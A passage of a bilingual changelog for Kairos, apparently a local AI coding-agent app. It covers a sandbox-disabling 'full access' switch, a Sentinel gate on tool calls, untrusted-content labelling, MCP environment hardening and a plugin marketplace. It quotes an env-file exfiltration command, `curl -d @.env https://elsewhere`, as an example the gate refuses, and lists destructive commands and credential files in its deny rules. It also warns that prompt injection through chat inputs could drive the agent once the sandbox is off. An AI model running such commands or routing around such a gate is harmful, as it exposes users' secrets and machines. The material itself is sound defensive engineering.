  The voice panel also lost three knobs it never needed: an engine dropdown with
  one real answer, and a speech-to-text provider and language box configuring a
  path nothing used — the composer's mic runs the browser's own recogniser.

- **新增全局「完全放开沙箱」开关：环境变量 `KAIROS_FULL_ACCESS` 或
  `settings.json` 的 `fullAccess` 字段，任一为真即生效。** 默认关闭，关闭时
  行为与之前逐字一致。这是给「自己出题、自有机器、内部使用」的用户准备的
  逃生门：开启后 agent 的终端与文件工具不再被限制在项目目录内，可以读写
  本机任意路径、执行任意命令（含 `&&` / `|` / `>` 等 shell 语法）。两条
  来源都收敛到新模块 `kairos/access_control.py:is_full_access()`：

  - 环境变量 `KAIROS_FULL_ACCESS` 取 `1` / `true` / `yes` / `on`（大小写
    不敏感）；
  - `settings.json` 的 `fullAccess` 布尔字段，已加入 `Settings` 数据类
    （默认 `False`，`_to_dict` / `_from_dict` 与 `SettingsStore.update` 均已
    支持），可经现有 `GET/POST /api/projects/settings` 读写。环境变量为
    假值时不会强制关闭——仍会继续读 settings，符合「任一为真即开启」。

  开启后放开的是下面 8 处（每一处都只在开关为真时跳过，关闭时原样保留）：

  - `kairos/tools/base.py`：`_resolve_safe` 抛出的
    `PermissionError("Path outside project directory")`——`file_read` /
    `file_write` / `file_edit_replace` / `multi_edit` / `find` / `grep`
    全部走这条路径；
  - `kairos/tools/terminal.py`：`SHELL_OPERATORS` 拦截、`ALWAYS_DENY_HEADS`
    拦截、命令白名单（`not on the command allowlist`）与按 head 的参数
    限制、`_escapes_cwd()` 的项目外路径检查、`_resolve_cwd()` 的 cwd 越界
    检查；执行方式也一并改为 `create_subprocess_shell`（Windows 上即
    `cmd /c`，POSIX 上 `/bin/sh -c`），管道 / 重定向 / `&&` 才真正可用——
    开关关闭时仍走原来的 `create_subprocess_exec`（无 shell），行为不变；
  - `kairos/sandbox/enhanced.py`：`scoped_workspace` 的
    `PermissionError("Path outside workspace")`；
  - `kairos/auto_checkpoint.py`：`before_write` 的
    `path outside project root` 与 `path traversal rejected` 两个短路返回。

  刻意保留、不随开关放开的是「防毁机器」而非「防越权」的那几条：`format`
  / `mkfs` / `diskpart` / `shred` / `bcdedit` 的 head 在 full access 下仍
  被拒（`kairos/tools/terminal.py:FULL_ACCESS_ALWAYS_DENY_HEADS`，叠加原有
  的 `DENY_PATTERNS` 扫描）。用户明确只要求「任意命令」，没有要求连整盘
  擦除也要能跑。

  **安全取舍（务必知悉）**：开启后微信 / IM 等外部输入通道可能被诱导，
  让 agent 以本机权限执行任意命令、读写任意文件——沙箱消失后，提示注入的
  后果从「跑不出项目目录」变成「跑得动整台机器」。该开关只应在用户自己的
  机器、面向可信输入时打开；默认关闭即为此。

### Fixed

- **A reply asked to be spoken is no longer silently dropped.** The server
  engine answered, the audio went to an `<audio>` element, and `play()` refused
  — which is what autoplay policy does before anything has been played from the
  origin. The rejection propagated instead of falling back, so the one failure
  this module exists to cover (voice mode on, nothing audible) was the one it
  did not survive. It now falls through to the browser voice and always clears
  its "speaking" state.
- **Saving the voice panel no longer fails.** The drawer saves all five settings
  sections in one request, and the panel's five new fields (`voiceMode`, `rate`,
  `volume`, `pitch`, `engine`) were not declared on the server-side
  `VoiceSettings`. The request answered 500 with `TypeError: VoiceSettings.__init__()
  got an unexpected keyword argument 'voiceMode'` — and because the sections
  travel together, the provider keys in that same payload were lost with it.
  Both halves now have a test that posts exactly what the panel posts.
- **The chat page has a microphone.** The composer's mic runs the browser's own
  recogniser, because there is no server-side speech-to-text to call
  (`sttProvider` is `"mock"` and no engine ships): it writes what it hears into
  the message box the user was already typing in, and records nothing. It is
  absent where no recogniser exists rather than present and inert, and it returns
  to its idle state when the recogniser stops on its own — silence, a refused
  permission — not only when the user clicks it off.

### Fixed

- **在设置里保存一次，真密钥就可能被遮罩串覆盖，下一次 LLM 调用 401。**
  Settings 抽屉把 `apiKey` 渲染成 `sk-1234...abcd` 的形状，保存时回传的是这个
  占位串；`SettingsStore.update()` 之前对该字段不做校验地 merge，占位串会被当成
  真值写回 `settings.json` —— 下一次调用就是 `AuthenticationError`。现在在补丁
  入口统一摘掉「看起来是遮罩（含 `...` / `***` / `…` / `•`）或为空」的 `apiKey`，
  保留磁盘上已有的值；同一个补丁里的其他字段（model / baseUrl / endpointUrl 等）
  照旧生效。注意这是有意的取舍：**清空密钥字段不再能删掉已存的密钥**，需要清空
  请直接改 `settings.json`。覆盖 3 个回归测试：嵌套 `provider.openai` 写法、
  顶层 `provider_openai` 写法、以及空串不清空。

### Removed

- **左下角的「机器人」入口（通用连接器配对）。** 个人微信现在走原生 iLink 通道
  （📱 微信），这个入口只剩一条通往通用连接器 API 的死路，按用户要求去掉。同组
  的语音、微信、设置、主题都在原位；`RobotPanel` 的实现仍留在 `SettingsDrawer.tsx`
  里，但已经没有入口能到达它。

### Added

- **工作目录可以在项目建好之后再改**（`PATCH /api/projects/{id}` 现在接受
  `work_dir`）。agent 的终端工具在构造时就被绑定到项目工作目录
  （`TerminalTool(allowed_cwd=...)`），所以建项目时没填目录的项目会一直被困在
  自动生成的空工作区里，任何解析到别处的路径参数都会被拒
  （`argument '...' resolves to a path outside the project directory`）。之前只能
  重建项目才能换目录，现在原地改就行；目录必须已存在（否则 400
  `工作目录不可访问`），下次重建 agent 时生效。覆盖 5 个回归测试。

## [0.1.7] - 2026-09-29

### Added

- **A preset for a router you host yourself.** FreeLLMAPI
  ([`tashfeenahmed/freellmapi`](https://github.com/tashfeenahmed/freellmapi), MIT)
  stacks the free tiers of many providers behind one OpenAI-compatible `/v1`.
  Pointing Kairos at it is now a dropdown entry instead of a typed URL: the preset
  fills `http://localhost:3001/v1/chat/completions` and deliberately leaves the
  model field empty. Its catalogue belongs to the router — the list comes from the
  router's live `/v1/models` — so nothing it aggregates is copied in here, neither
  in the preset nor in `kairos/providers_more.py`, where the entry ships no models
  either. Two tests hold that line, one on each side.

- **Artifacts: what a run produced, as things you can answer.** A round's plan,
  its result, a screenshot the browser tool took — the loop has always produced
  these, and the UI has always shown them as lines scrolled past in a
  transcript. `kairos/artifacts.py` keeps them as rows with a kind, a title, a
  body and a thread; the durable tick writes one plan and one result per round,
  and the browser tool's screenshot branch writes one per shot. `/artifacts`
  lists them, opens them and takes comments, and `GET /api/artifacts/{id}/file`
  serves the image behind a screenshot — only files under the app's own data
  directory, and only images, because a path that came out of a database row is
  not a promise. Best effort by construction: with no database, every producer
  returns None rather than failing the round that produced it.

- **An issue can become a project.** `POST /api/hooks/github` and
  `POST /api/hooks/linear` take signed deliveries and create the project.
  Verification is HMAC with a constant-time compare; secrets come from the
  environment (`KAIROS_HOOK_GITHUB_SECRET`, `KAIROS_HOOK_LINEAR_SECRET`), and
  with no secret configured the endpoint answers **503 instead of accepting
  anything**. The project list is the ledger — the issue id is written into the
  description as `[github#7]`, so a redelivery finds the project instead of
  making a second one, and an event we do not act on is answered 200 so the
  provider stops retrying. `GET /api/hooks/status` reports which doors are open
  without echoing a secret. It deliberately does not start the loop: creating a
  project is reversible, spending tokens is not.

- **`har` could be resumed from a terminal only — now the app drives it.**
  `kairos/har.py` has been the durable-task contract since Round 29: a goal that
  does not change, a round count, a plan, a history, a lock. It had **no caller
  outside its own CLI**, so "kick off a multi-day refactor, close the laptop,
  pick it up tomorrow" meant opening a terminal. `kairos/durable.py` binds the
  contract to the project's real Coder/Reviewer loop and `api/routes/tasks.py`
  exposes it; `GET /api/tasks/{project}` also lists the background subagent
  handles and autonomous jobs that were previously only discoverable if you
  already knew the handle.

  - `har.resume_async` is the same state machine with an **awaited** tick. The
    sync `resume()` stays for the CLI and the tests; it could not be reused here
    because the tick drives the project's loop, whose HTTP clients belong to the
    app's event loop — hopping to a worker thread to satisfy a sync signature
    hands those clients a different loop, which is a hang rather than an error.
  - A tick is one run of the real loop, and state is saved after each one, so an
    interrupted tick loses only the round in flight.

- **The gate can ask.** `kairos/approval.py`'s ladder returns ASK for actions
  that are neither clearly safe nor clearly forbidden, and until now an ASK had
  to be resolved by policy: allowed when the gate is not strict (so the ladder
  was only advice) or refused when it is (so the first file write deadlocks a
  run). `kairos/sentinel.py`'s own docstring named the missing piece — "ASK mean
  deny once an approval channel exists". `kairos/approvals.py` is that channel:
  `Sentinel.authorize_async` publishes the question, the tool call waits up to
  120 seconds, and the answer decides. Approving may record the same standing
  rule `POST /api/sentinel/allow` writes; denying, or never answering, is a
  refusal — an approval that never arrives must not become a permission. The
  prompt is mounted with the layout, so the question follows the user to
  whichever page they are on. The sync `authorize()` is untouched: a CLI run has
  nobody to ask, and a call that parks on a question nobody will see is worse
  than a verdict.

- **A Tasks screen — and a page the sidebar had always linked to.** `/tasks`
  shows the durable task (goal, round, score, approval, round history) with
  one-round and five-round resume buttons, beside the background subagents and
  autonomous jobs. It is deep-linkable (`?project=<id>`), like Run and History.
  Adding it surfaced a dead link: the sidebar has linked `/dashboard` since
  R38.13 and **no route ever served it** — the page existed, the route did not.
  All 37 new strings are translated for all 63 languages (1281/1281 keys, 100%).

- **Two capabilities the agent was promised and never had: `browser` and
  `computer_use`.** `kairos/browser.py` and `kairos/computer_use.py` both
  shipped with unit tests and **no caller** — the agent's toolset was twelve
  tools and none of them was a browser — while the bundled `computer-use` skill
  told every model "You have a `computer_use` tool that drives the user's
  desktop". A skill that promises a tool the registry does not contain is not a
  documentation bug: the model plans against it and fails at the first step.
  Both are real tools now.

  - `browser` drives the **same** per-project Chromium context the Browser tab
    shows, so a navigation the model performs appears there live and its
    screenshot is of the page the user is already looking at. Actions:
    `navigate`/`open`, `click`, `type`, `key`, `evaluate`, `content`, `console`,
    `current`, `screenshot`, `viewport`, `back`/`forward`/`reload`, `close`.
    `content` exists because a text-only model cannot read a PNG — it returns
    the page's visible text. URLs pass the lenient SSRF guard
    (`validate_config_url`): the loopback and LAN hosts a developer legitimately
    verifies are allowed, cloud metadata and unresolvable hosts are not.
    Screenshots are written under the app's data directory, never into the
    project workspace, so browsing cannot dirty the tree the Reviewer reads.
  - `computer_use` exposes the desktop backend that already existed: `capture`,
    `screen_size`, `click`, `move`, `type`, `key`, `scroll`, `history`, plus
    `dry_run`. Every result names the backend that ran, because the default is
    `MockComputerUse` — a mock that silently reports "clicked" is worse than no
    tool at all.
  - Both are wired in `Orchestrator._create_agents`: the Coder gets both, the
    Reviewer gets the browser (verifying a UI is a review question). A machine
    without Playwright degrades to a Coder without a browser, not to no Coder.

- **The gate covers the new tools on the same terms as everything else.**
  `browser` is a network tool, so reading a page taints the run; a screenshot is
  not egress, but a navigation, a click or a keystroke is, and is refused in a
  tainted run. `computer_use` is a new taint source (`screen`) — the pixels
  belong to whatever application happens to be open — and capturing or reading
  the history stays allowed while clicking and typing are egress. Judging these
  two by tool name alone would have blocked the screenshot the agent needs to
  describe its own work.

- **The precheck runs a type check where the project is configured for one.**
  mypy runs on the changed files when the project has a mypy config, and a
  locally installed `tsc --noEmit` when `tsconfig.json` and
  `node_modules/typescript` are both present. An unconfigured project gets no
  type check — an unconfigured mypy reports hundreds of pre-existing complaints
  the Coder cannot tell from its own — and nothing here can reach the network:
  `npx tsc` would download the compiler, so it is never used.

- **The bundled skill library is now checked against the tool registry.** 547 of
  the bundled skills were imported from other harnesses, and the `computer-use`
  skill was not the only one naming tools that do not exist here. A test freezes
  the list of skills that reference a foreign vocabulary (Hermes' `mode="som"` /
  `cua-driver`, Claude Code's `Task(` / `TodoWrite`), fails when a new import
  adds one, and fails when the list rots. The three that promise a desktop or
  browser tool carry a reality-check header naming what actually exists.

- **A gate every tool call passes through — the idea is Muse's Sentinel, adapted
  to a local agent.** Meta's Muse runs each user in an isolated cloud VM with a
  separate authority that gates actions and network egress, which the agent can
  propose to but never override: it lets the agent work unattended without
  handing it the machine. This project had the same intent written down — a
  `PermissionPolicy`, an approval-mode ladder — and **no call site**: the policy
  was constructed in one API route and consulted by nothing. `kairos/sentinel.py`
  is now that one place, and it lives at the single choke point where built-in
  tools *and* MCP tools (they are exposed as `BaseTool` adapters) reach the
  outside world, so a refusal cannot be routed around by choosing another tool.

  What it enforces, in order: the user's own `deny`/`allow` rules outrank
  everything; private keys, cloud credentials, `.netrc`/`.git-credentials` and
  this app's own key store are refused in every mode; and — the part taken
  straight from Muse — **tainted egress**: once a run has read content it cannot
  vouch for, actions that *send data out* are refused. What taints a run is
  calibrated for a coding agent rather than for Muse's payments-and-email agent:
  the network and third-party MCP servers taint a run, local reads do not,
  because tainting on the repository the agent was asked to edit would refuse
  every write and teach the user to switch the gate off. In a tainted run a
  fetched page still gets summarised, the tests still run, the commit still
  lands; `curl -d @.env https://elsewhere` does not. A refusal comes back to the
  model as a tool error that names the rule and the user's options, and tells it
  not to look for another route.

- **Untrusted content is labelled where it re-enters the context.** Tool results
  from the network or from a third-party MCP server are wrapped in
  `<untrusted_content source="...">`, and the system prompt states that anything
  inside is data to reason about, never instructions. Muse labels external input
  in its harness for the same reason: the model should be able to tell a page
  from the user.

- **A gate API and an audit trail.** `GET /api/sentinel/audit` returns recent
  rulings with a tally of refusals; `GET /api/sentinel/status` reports what is
  being enforced; `POST /api/sentinel/allow` records a standing rule the user
  grants, which is the escape hatch a refusal points at. The trail stores a
  fingerprint of each call's arguments rather than the arguments themselves —
  credential-shaped substrings are redacted before anything is written, in the
  resource field as well as the reason — because an audit trail that keeps raw
  tool arguments is a new place for secrets to collect.

- **The gate reaches subagents.** A child is built with the parent's tracker and
  refuses tainted egress on its own account: fan-out must not be a way to act on
  what the parent read.

### Fixed

- **`computer-use` described a tool that is not this one.** The skill was
  imported from Hermes verbatim, 382 lines of it: it taught a `mode="som"`
  capture, element indices, `capture_after=True`, a `cua-driver` binary and a
  background-delivery contract that never steals focus. None of that exists in
  this project. The tool that does exist moves the real cursor, so the skill
  now says so, and documents this tool's actions instead.

- **A policy nothing consults is decoration.** `PermissionPolicy` and the
  approval ladder existed, were tested in isolation, and were wired to no
  execution path at all — `decide()` had no callers outside its own re-export.
  A `deny` rule a user wrote changed nothing about what the agent did. It is now
  enforced at the choke point, with tests that fail if the wiring is removed.

- **An MCP server was started with the host's entire environment.** The child
  was spawned with `{**os.environ, ...}`, so every key a user had ever exported —
  provider keys, cloud credentials, database passwords — was readable by any
  third-party server, and by anything that managed to run inside one. Children
  now receive an allowlist of what they need to run plus whatever the server's
  own definition declares (naming a token in `mcp.yaml` is an explicit decision,
  so it still passes), and credential-shaped variables are withheld even if one
  reaches the allowlist. `KAIROS_MCP_INHERIT_ENV=1` restores the old behaviour
  for a server that genuinely needs it.

- **A stale system proxy made the marketplace look offline.** Windows hands every
  process the proxy in the registry. A leftover entry — `ProxyEnable=1` pointing at
  `127.0.0.1:7897` after the tool that owned it stopped — refuses every connection
  with `WinError 10061`, and the marketplace reported each remote source as
  unreachable: the plugins and skills tabs, which default to remote sources, came
  up empty with "由于目标计算机积极拒绝，无法连接" and no listing. Outbound
  marketplace fetches now try a direct connection first and fall back to the
  configured proxy, logging which one was used, so a proxy a user actually runs
  still works while a dead one stops being fatal. Measured from a machine with the
  stale entry: all six sources failed before, four now return entries, and
  Smithery fails with a real network timeout rather than a refusal.

- **A browser that opened onto a port nobody was listening on.** Starting the app
  waited for every MCP server the user had configured: the servers were started
  inline while `api.app` was still being imported, before uvicorn owned a port.
  With five configured servers — four whose command is not installed, one that has
  to reach a network it cannot — that was **129 seconds** of "127.0.0.1 refused to
  connect", because the launcher gives up waiting after 30 and opens the browser
  anyway. The start phase also ran twice, so one 50s timeout became two. Startup
  now serves first and warms the servers on a background task: the port opens in
  about **four seconds** and the servers arrive when they arrive. `start_all` is
  idempotent, so entering the phase twice no longer respawns a server that is
  already answering or retries one that already failed this session. The deferral
  is opt-in — the API layer asks for it before building its orchestrator — so a CLI
  run, `kairos demo` and any library caller still start their servers inline
  exactly as before. The launcher waits up to 180 seconds for the port, and still
  opens the browser when that expires, so a genuinely broken start stays visible
  instead of silent.

- **The marketplace called things installed that were not, and said nothing
  about things that were.** Both tabs answered from bookkeeping files: the plugin
  list from `plugins.json` (a catalogue of what *can* be installed) and the
  skills list from `installed.json` (one install script's 29 records). So the
  plugins tab drew a green tick against all 20 catalogue entries whether or not
  anything was behind them, the "Installed here" count was a catalogue size
  rather than a state, and a plugin or a skill installed from a remote source —
  the only kind this page can install — did not appear as installed anywhere,
  including on the row the install had just come from. Both endpoints now read
  the running system. `/extensions/plugins` returns what this build ships, what
  the user added and what the registry could still install, each with
  `installed` and an `origin` (`bundled` / `user` / `registry`);
  `/extensions/skills` returns what the loader actually discovers, with `scope`
  and the frontmatter `category`, and reports a record whose file is gone as
  missing instead of silently dropping it. The count is that number now — 7
  plugins and 581 skills on a working install, against 20 and 29 before. Remote
  rows match an entry on its name *and* its upstream id, so a Cline entry that
  installs under its id is recognised as installed too.

- **A marketplace for the three kinds of extension.** MCP servers, plugins and
  skills each had a list somewhere and no way to act on it: installing a server
  meant hand-editing `mcp.yaml`, and there was nowhere that answered "what else
  could this thing do?". The new page (`/marketplace`) puts all three behind one
  tabbed view. Installing an MCP server writes it into the user's `mcp.yaml`
  atomically and only touches that one entry, so an existing configuration
  survives; uninstalling removes just that entry. Bundled servers are marked as
  such because they need no download and work with the network unplugged.
  Plugins are listed with what they contribute (they load from disk, so there is
  nothing to install) and skills are searchable by name, category and text.

- **The marketplace reaches beyond what we shipped.** A curated list of 26 servers
  answers "is anything installed?" and not "is there anything else?", so the MCP
  tab now has a source selector. Two remote marketplaces are wired up, and only
  two, because these are the ones that survive being checked rather than read
  about: the **official MCP registry** (`registry.modelcontextprotocol.io` —
  public API, no sign-in, and entries that carry an npm package plus
  `runtimeHint: npx` for a local server or a `remotes[].url` for a hosted one) and
  the **Cline marketplace** (`github.com/cline/marketplace`, entries with explicit
  `install.args[]` / `install.env[]`, fetched through jsDelivr because
  `raw.githubusercontent.com` is unreliable from mainland China). Both are
  normalised into the same shape the curated registry uses and installed through
  `install_entry`, so a remote server lands in `mcp.yaml` exactly as a curated one
  does — credentials written as `${VAR}` references, never literals. Entries with
  neither a launcher nor a URL are still listed, with a link to their homepage and
  a disabled button instead of an Install that could not work, and a source that
  cannot be reached says so rather than showing an empty list that reads as "no
  results". The two failure modes are the same one: never claim something works
  that has not been shown to.

- **"Test" on an MCP server really starts it.** The button sends a real request
  to a new `POST /extensions/mcp/probe`, which launches that one server and waits
  for an MCP `initialize` handshake, reporting the tools it exposes or the error
  it failed with. A server that is listed but cannot answer is worse than one
  that is absent — that is exactly how 0.1.5 shipped — so the marketplace can
  prove each entry works rather than asserting it.

- **The transcript shows how an answer was reached.** Messages are grouped into
  turns — your question, then a collapsible process block, then the reply — and
  the block summarises the run (`Process · 4 steps · 12.4s`, plus a count of
  failures). Each step is a row: thinking, or a tool call with its arguments, its
  outcome and **its own duration**, paired from the call and its result by turn
  and tool so two calls to the same tool don't borrow each other's timings. A
  call that has not returned yet reads as running and claims no duration. The
  block is open while the turn runs and folds away once the answer lands, unless
  you have opened or closed it yourself.

- **Replies are rendered as Markdown.** They were plain text with preserved
  whitespace, so code fences, lists and emphasis arrived as literal characters.
  The renderer is a small local module rather than a dependency: the app ships as
  a frozen binary and the bundle is part of it. It builds React elements rather
  than HTML, so a reply containing a script tag is text and a `javascript:` link
  stays inert.

- **The marketplace installs plugins and skills, from four more public sources.**
  The MCP tab could browse and install; plugins and skills could only be looked at,
  because there was nowhere to install them *from*. Wired up now: **Smithery**
  (17,061 MCP servers — its list endpoint names no endpoint URL, so the detail is
  fetched only for the entries actually returned, and an entry whose detail fails
  comes back marked non-installable with the reason rather than as a silent
  omission), **Cline's plugin and skill registries** (16 and 38), **Anthropic's
  official Claude plugin marketplace** (311 plugins across four different `source`
  shapes, all of them walked) and **`anthropics/skills`** (19). Each is normalised
  into the same entry shape and installed through one path.

  A Claude plugin converts to a Kairos plugin on install: `commands/`, `agents/`,
  `skills/`, `hooks/` and `.mcp.json` are copied, a `kairos-plugin.yaml` is written
  with `capabilities` derived from the directories that **actually exist** (a Claude
  plugin's manifest declares none of them — its components are found by directory
  convention, which is why the four ports this project already carried worked
  unchanged), `CLAUDE_PLUGIN_ROOT` is rewritten to the installed directory, and
  `ATTRIBUTION.md` records the upstream URL and the original manifest verbatim. A
  file that depends on a Claude-only facility is skipped and **named in the
  install's warnings** instead of being dropped quietly, and a plugin whose licence
  is not permissive is refused outright — installing `claude-security` today fails
  with "its licence looks like proprietary", which is the rule working as intended.

  Listings read the repository **tarball** rather than an index, because it is the
  only source measured to be both complete and unthrottled. jsDelivr's file API
  came back empty for whole plugin directories of this very marketplace
  (`claude-security` 42 files, `code-modernization` 29, `cwc-makers` 6 — all zero
  through the CDN), which would have installed an empty plugin and reported success.
  GitHub's git-trees API is authoritative but allows an anonymous caller 60 requests
  an hour, which is how a real install failed with `403 rate limit exceeded`. One
  3 MB download returns the listing and every file's contents together, so an
  install costs one request instead of one per file. The API stays as the fallback,
  and when both roads are closed the source says why — a source that cannot be
  reached must never look like a source with nothing in it. The Claude
  marketplace's own `marketplace.json` is read that way too: jsDelivr stopped
  answering from this network mid-session (three consecutive live loads returned
  `unreachable ([SSL: UNEXPECTED_EOF_WHILE_READING])`), and the source now lists
  all 311 plugins from the tarball with the CDN kept as the fallback.

### Changed

- **Replies no longer carry a role name.** The transcript printed "Kairos" above
  every agent reply and "审查员" above every reviewer reply. A name over a
  paragraph invites the reader to file the text under a person instead of judging
  it, and it has to be skipped on every single turn. The mark and the bubble
  already say who is speaking, so both labels are gone; the reviewer's score and
  approve/request-changes verdict stay, because that is the part that carries
  meaning. The same slot also stopped printing the pipeline's internal stage ids
  (`coder.summary`, `reviewer.summary`), which say the same thing in a rawer
  form — the trace view is where stage attribution belongs. Step rows keep their
  labels, because there "which step is this" is a real question.

- **The bottom-left rail is grouped and shows where you are.** It was nine
  same-weight icons behind an "Advanced" disclosure, with two rows in a different
  chrome — and, after all that, no indication of the current page. It is now
  three labelled groups (Navigate / Extensions / System) plus Preferences, all on
  one three-column grid so the column edges line up down the whole rail, with the
  current route marked the same way the active project is marked. Nothing is
  hidden behind a disclosure any more, and Settings and the theme switch share the
  same cell shape as every destination, because they are also one click. The
  column count comes from the longest label the rail has to hold — a screenshot
  check caught it truncating its own labels at four.

- **The i18n translator reports the work it did and fails when it did none.**
  `translate_i18n.py` printed `all validated` after a run in which every batch was
  rejected with HTTP 401 and not a single key was written — a catalog that gained
  nothing has no quality problems either, so the summary could not see the
  difference. It now reports how many keys it filled, and exits non-zero when
  batches failed, because a rejected key leaves the catalogs exactly as they were.



## [0.1.6] - 2026-09-17

### Fixed

- **The packaged app can start its MCP servers.** `mcp` is an optional extra, so
  PyInstaller never followed an import to it and the frozen builds shipped
  without it: the app came up, listed five bundled servers, and could not start
  one — `ModuleNotFoundError: No module named 'mcp'`. Every start burned the
  60-second budget on request timeouts before the UI was reachable, and the whole
  MCP layer, including the HTTP transport added in 0.1.5, was dead in the
  binaries and the wheel. The build now collects `mcp` and its submodules.

- **The smoke test asks a server to answer instead of counting them.** The check
  that should have caught that counted configured servers; it now launches two of
  them and requires a real `initialize` reply, failing the build if they don't.
  It probes only a frozen binary — a source install from core dependencies has no
  `mcp` and that is correct, and `--mcp-serve` is a flag only the frozen launcher
  understands.

- **The Anthropic form can fetch its model list.** The fetch control had grown
  inside the OpenAI form only, so selecting Anthropic in the LLM settings showed
  a bare text input and no way to ask the endpoint what it serves. It is now one
  component, rendered by both forms, so they cannot drift apart again. The
  protocol comes from the form rather than a hardcoded "openai" — the same
  hardcoding that made the backend's Anthropic branch unreachable and had it
  answer any Anthropic endpoint with a list of MiniMax models.

- **A test that only passed on Windows, and the CI that ran on Linux.** The
  updater fixture defaulted to a `windows-x86_64` asset while the updater selects
  with `platform_key()`, so on Linux it described a release with nothing this
  machine could use and the assertions died with a `TypeError` that read like a
  broken updater. The fixture now builds the asset for the platform it runs on,
  and two tests state the intended behaviour for all three platform keys.

- **One test's provider settings no longer leak into the next.** The drawer's
  reset between tests omitted `provider`, so an active provider, its URL and its
  key carried over.

### Security

- Nothing credential-shaped was imported from the other agents surveyed for
  0.1.5: four candidate files were refused by the gate rather than copied.

## [0.1.5] - 2026-09-16

### Third-party content

This release ships skills that were imported from other agents installed on the
author's machine; each carries `imported-from:` and a `source-path:`. Where the
source was a licensed plugin, the upstream LICENSE and an `ATTRIBUTION.md` are
included alongside it. Where it was another agent's own skill directory the
licence is not stated upstream — review those before redistributing this tree:

```bash
grep -rl '^imported-from:' kairos/skills | wc -l          # how many
grep -rh '^imported-from:' kairos/skills | sort | uniq -c # from where
```

Nothing read as a credential was imported: candidates containing a key-shaped
string were skipped rather than copied.

### Security

- **A credential gate guards the import.** Any candidate file containing a
  key-shaped string is skipped and logged rather than copied. Four were refused.
- **No machine-specific paths in the release.** A repo-hygiene test caught 46
  lines across 11 skills that carried drive letters, a user name, or notes about
  private projects (including the filenames of private secret files). The notes
  about this particular machine were dropped from the repo — their originals are
  untouched — and the reusable ones were rewritten. The public tree now carries
  no drive letters and no user names.

### Added

- **The skills, plugins and MCP servers the other agents already have.** A
  survey of every agent installed on this machine found 1941 distinct skill
  names. The 554 that are genuinely written to the SKILL.md spec — real content,
  a declared description — now ship with the app, each recording the agent it
  came from. Five plugins from the Claude Code marketplace (Apache-2.0 / MIT,
  verified before copying, upstream LICENSE and an ATTRIBUTION.md included)
  became bundled plugins, and the vendor-published MCP servers from that
  marketplace are in the registry: off by default, one line to enable, because
  each needs a runtime this build does not ship.

- **The capability view has a screen: Tools → Capabilities.** It shows what the
  agent actually has in the current project — skills with their scope, priority
  and whether they carry a trigger; the MCP servers that are configured, where
  each came from (your config, a project file, or the bundled defaults) and
  which ones were rejected *with the reason*; the servers this build runs itself
  with their tool names; the plugins it ships, next to the ones you installed
  and the ones the registry could install; the built-in tool list; and a
  **Problems** panel that names anything unusable. It reads the runtime on every
  open, so it cannot describe an install that is not there.

- **MCP servers can be remote again.** The client spoke stdio only, so the
  servers that actually exist in the world — hosted endpoints behind a token —
  could not be configured at all. `transport: http` (Streamable HTTP) and
  `transport: sse` now connect over the official SDK transports with the same
  surface as the stdio client, so the tool adapter and the registry cannot tell
  the two apart. Credentials ride in `headers` and may reference the
  environment (`"Authorization": "Bearer ${MY_TOKEN}"`); nothing is spawned,
  and a missing `url` fails loudly instead of being quietly ignored. Tested
  against a real Streamable-HTTP server started in-process — not a mock.

- **`GET /api/extensions/capabilities` — what the agent will actually have, and
  what is missing.** One read-only answer for a project: every skill the loader
  returns with its scope (project / global / bundled), priority and trigger; the
  MCP servers that are configured, which are rejected *and why*, and the offline
  servers this build ships with their tool names; installed plugins with their
  declared capabilities and compatibility; the native tool list; and a
  `problems` array that names what is unusable instead of dropping it. Header
  *names* are reported, never their values. `?probe=true` additionally starts
  the configured servers and reports live tool counts and startup errors.

  It exists because the registry and the runtime could disagree unobserved:
  `/extensions/summary` counted 29 installed skills while `SkillsLoader`
  returned none at all. The two endpoints are kept side by side on purpose —
  one describes the install, the other the running system.

- **`kairos doctor` counts every bundled server.** The bundled-server check
  skipped `filesystem` (which keeps its own tool table in an older module) and
  reported "11 tools" for what is really 16. The doctor and the capability view
  now resolve tool names through one function, so the two numbers agree.

- **A fresh install already has working MCP tools, from a plugin that ships
  with it.** The five servers Kairos serves itself — filesystem, git, sqlite,
  time, fetch, sixteen tools between them — used to be *bundled but
  unconfigured*: nothing was reachable until you wrote an `mcp.yaml` by hand.
  They now arrive through a bundled plugin, `kairos-essentials`, loaded straight
  from the package: no npm, no pip, no network, no API key, and nothing copied
  into your home directory.

  Precedence is bundled defaults < `~/.kairos/mcp.yaml` <
  `<project>/.kairos/mcp.yaml`, merged field by field, so overriding one setting
  keeps the rest, and `enabled: false` turns a server off. Entries use
  `bundled: <name>` — resolved to whatever launch actually works in this
  install (a `-m` module from a checkout, a built-in flag from a packaged
  build) — and `{project_dir}`, which is also the sandbox root the filesystem
  and git servers work in.

  `GET /api/extensions/capabilities` now reports each server's `source`
  (`bundled-plugin` / `user` / `project`) and separately lists the plugins this
  build ships, the ones the user installed and the ones the registry could
  install — so "what did I get?" and "why is this here?" are both answerable.
  `kairos-essentials/mcp.yaml` also lists the common servers that need *your*
  account (github, gitlab, notion, linear, slack, postgres, redis, sentry,
  cloudflare, brave-search) and the ones that only need Node (playwright,
  puppeteer, context7, sequential-thinking, memory) with their real commands,
  ready to copy, with credentials read from the environment rather than stored.

- **Rename a project by double-clicking its name.** The sidebar's project list
  edits in place: double-click the name — including the "untitled" placeholder —
  type, Enter. Escape cancels, an empty name is refused, and the write goes
  through `PATCH /api/projects/{id}`, so the new name is what the list, the chat
  header and the gate report all show. It is optimistic: the list updates at
  once and rolls back if the write fails.

- **The app can update itself — one click, and only when it can prove what it
  downloads.** A cached, read-only check against GitHub Releases
  (`GET /api/update/check`) feeds a banner in the app shell and a version row in
  About; **Update now** downloads the release asset, verifies the SHA-256 the
  same CI run published in `SHA256SUMS`, and hands the swap to a detached helper
  that replaces the binary after you quit and starts it again. Where
  self-replacement is not possible — macOS, `pip`/source installs, a read-only
  install directory, a release with no published checksum — the banner says why
  and points at the release page. The release workflow now publishes
  `SHA256SUMS` for every artifact.

## [0.1.4] - 2026-09-13

### Added

- **Feedback that asks for nothing, and a route that cannot be missed.** The foot of the
  Settings drawer opens a box: write it, then review and submit the prefilled issue on
  GitHub. No email field, and the payload is exactly what the user typed — no version, no
  OS, no logs — with a test that fails if any of that ever changes. A markdown issue
  template carries the framing (form templates make GitHub drop the `body=` prefill), and a
  workflow assigns each new issue to the maintainer and mentions them, so delivery does not
  hinge on anyone's notification settings.

### Fixed

- **A provider preset is the user's choice, not something re-derived from the fields.**
  The drawer re-ran `matchPreset` on every edit, and that function trusted a model *name*
  and a host *substring* — so picking "custom URL" with a model called `deepseek-*` snapped
